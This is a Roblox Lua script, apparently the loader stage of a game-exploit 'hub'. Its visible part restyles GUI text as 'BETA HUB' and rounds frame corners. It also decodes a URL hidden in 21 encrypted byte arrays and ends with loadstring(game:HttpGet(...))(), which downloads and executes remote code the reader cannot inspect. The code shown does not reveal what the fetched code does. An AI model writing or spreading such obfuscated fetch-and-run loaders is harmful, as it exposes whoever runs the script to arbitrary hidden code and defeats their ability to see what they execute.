
--[[ STAGE 2: VISUAL CORE ]]
local ck8ftPzA7WBK1BBtcMe6NKeD = bit32 and bit32.bxor
if not ck8ftPzA7WBK1BBtcMe6NKeD then
    ck8ftPzA7WBK1BBtcMe6NKeD = function(a, b)
        local r, m = 0, 1
        while a > 0 or b > 0 do
            local aa = a % 2
            local bb = b % 2
            if aa ~= bb then r = r + m end
            a = (a - aa) / 2
            b = (b - bb) / 2
            m = m * 2
        end
        return r
    end
end
local function fHKZWgv6zOp2rBrD(data, a, b, m, s, r)
    local out = {}
    for i = 1, #data do
        local v = data[i]
        local step = (b + i * s) % 256
        if m == 0 then
            v = (v - step) % 256
            v = ck8ftPzA7WBK1BBtcMe6NKeD(v, a)
        else
            v = ck8ftPzA7WBK1BBtcMe6NKeD(v, a)
            v = (v - step) % 256
        end
        out[i] = string.char(v)
    end
    local res = table.concat(out)
    if r then
        res = string.reverse(res)
    end
    return res
end
local bxSLkh5M871dr4ZiTeoKZuhfW = {
  {{246, 206, 63, 62, 229, 39}, 177, 22, 1, 3, false, 7},
  {{238, 226, 227, 169, 151}, 193, 242, 0, 1, false, 2},
  {{6, 6, 29, 24, 7}, 108, 244, 1, 3, true, 1},
  {{250, 237, 224, 217, 221, 213}, 176, 220, 1, 6, false, 4},
  {{223, 210, 206}, 79, 158, 0, 5, false, 15},
  {{98, 145, 138, 73}, 159, 151, 1, 4, true, 10},
  {{79, 89, 70}, 224, 194, 0, 1, false, 21},
  {{112, 155, 104, 106, 129}, 78, 51, 0, 4, false, 3},
  {{179, 148, 67, 90}, 202, 23, 1, 3, false, 17},
  {{68, 89, 143, 133, 155, 174, 161}, 138, 154, 1, 4, true, 19},
  {{145, 168, 242, 242, 140, 135, 130}, 78, 116, 1, 6, false, 20},
  {{0, 6, 7}, 160, 40, 0, 5, true, 12},
  {{115, 101, 91, 97}, 58, 222, 1, 7, true, 9},
  {{172, 218, 168, 217, 195, 219, 213}, 146, 212, 1, 1, true, 11},
  {{109, 210, 41, 212, 194}, 211, 138, 1, 5, false, 13},
  {{18, 18, 21, 0, 0}, 183, 43, 1, 6, true, 6},
  {{66, 115, 72, 188}, 210, 41, 1, 6, false, 16},
  {{183, 185, 179, 185, 136, 139}, 236, 236, 1, 2, true, 8},
  {{214, 203, 189}, 17, 87, 0, 1, true, 5},
  {{79, 166, 85, 115, 115, 123}, 91, 160, 1, 5, true, 18},
  {{80, 132, 91, 177, 166, 92, 191}, 218, 19, 1, 5, true, 14}
}
local RKiMawCRLqbbZ_eci21ml = {}
for f0WqEC15y8MaSJq_3 = 1, #bxSLkh5M871dr4ZiTeoKZuhfW do
    local yzPcn_wy6idvjXa = bxSLkh5M871dr4ZiTeoKZuhfW[f0WqEC15y8MaSJq_3]
    RKiMawCRLqbbZ_eci21ml[yzPcn_wy6idvjXa[7]] = fHKZWgv6zOp2rBrD(yzPcn_wy6idvjXa[1], yzPcn_wy6idvjXa[2], yzPcn_wy6idvjXa[3], yzPcn_wy6idvjXa[4], yzPcn_wy6idvjXa[5], yzPcn_wy6idvjXa[6])
end
local Iqdt5ac4hYBqJcv6Fljhp7 = table.concat(RKiMawCRLqbbZ_eci21ml)
local HubName = "BETA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(Iqdt5ac4hYBqJcv6Fljhp7))()
